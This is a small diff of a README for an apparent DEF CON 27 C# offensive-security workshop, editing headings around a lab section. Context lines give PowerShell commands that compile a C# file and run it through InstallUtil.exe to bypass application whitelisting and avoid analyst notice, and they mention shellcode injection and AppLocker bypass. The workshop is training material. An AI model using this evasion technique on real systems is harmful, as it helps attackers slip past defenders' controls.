@@ -60,6 +60,7 @@ byte[] buf = new byte[674] {
 Inject to source code([1.cs](https://github.com/DharmaDoll/defcon27_csharp_workshop/blob/56a29e8fc1288a70bd0fbdd558014f9bf7396252/Labs/lab3/1.cs#L30))
 
 #### Bypassing Application Whitelisting ([2.cs](https://github.com/DharmaDoll/defcon27_csharp_workshop/blob/master/Labs/lab3/2.cs))
+##### living off the land and is used by attackers to circumvent controls and avoid detection.
 ```powershell
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe 2.cs
 #Now for the bypass, we can execute the following command to get InstallUtil.exe to run our assembly, instead of launching it directly
@@ -67,7 +68,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile=
 /LogToConsole=false /U 2.exe
 #we can abuse InstallUtil.exe and get it to run our code. This way we can bypass application whitelisting technologies and look less suspicious to an analyst.
 ```
-#### Bypssing Applocker
+##### Bypssing Applocker
 https://jpn.nec.com/cybersecurity/blog/220916/index.html
 
 ### Lab 4 : Shellcode Obfuscation
